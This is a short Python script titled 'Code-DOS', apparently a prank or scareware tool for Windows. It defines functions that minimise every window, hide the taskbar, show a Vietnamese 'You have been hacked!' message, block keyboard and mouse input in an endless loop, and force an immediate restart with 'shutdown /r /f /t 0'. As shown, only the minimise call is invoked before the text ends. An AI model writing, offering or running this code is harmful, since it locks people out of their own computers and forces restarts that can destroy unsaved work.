# Code-DOS
import ctypes
import threading
import time
import random
import os

user32 = ctypes.windll.user32
screen_width = user32.GetSystemMetrics(0)
screen_height = user32.GetSystemMetrics(1)

num_windows = 30
box_width, box_height = 300, 200  

def minimize_all_windows():
    HWND_BROADCAST = 0xFFFF
    WM_SYSCOMMAND = 0x0112
    SC_MINIMIZE = 0xF020
    user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MINIMIZE, 0)

def hide_taskbar():
    SW_HIDE = 0  # 
    taskbar = user32.FindWindowW("Shell_TrayWnd", None)
    user32.ShowWindow(taskbar, SW_HIDE)

def show_warning():
    MessageBox = ctypes.windll.user32.MessageBoxW
    MessageBox(0, "Bạn đã bị hack!", "Cảnh báo!", 0x40 | 0x1000)

def disable_input():
    while True:
        ctypes.windll.user32.BlockInput(True)  
        time.sleep(0.1)

def force_restart():
    os.system("shutdown /r /f /t 0")  

minimize_all_windows()
time.sleep(1)  
